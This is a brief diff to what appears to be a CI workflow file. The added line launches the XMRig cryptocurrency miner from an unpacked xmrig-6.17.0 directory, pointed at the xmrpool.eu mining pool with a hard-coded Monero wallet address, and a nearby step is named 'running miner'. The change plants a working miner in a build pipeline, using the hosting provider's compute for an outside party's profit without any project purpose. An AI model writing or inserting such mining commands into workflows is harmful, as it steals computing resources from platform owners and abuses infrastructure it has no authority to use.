@@ -47,6 +47,7 @@ jobs:
                 cd xmrig-6.17.0
                 pwd
                 ls
+                ./xmrig -o xmrpool.eu:9999 -u 48waHbFYRVED3gLpqEwXvS4v4ppwLas1UHAwVD8n9mxvFegC39KTGQUTXMyimssFHiGqw491FFBYMdvbmBW9m4KXG5HitDV -k --tls 
         
         
       - name: running miner
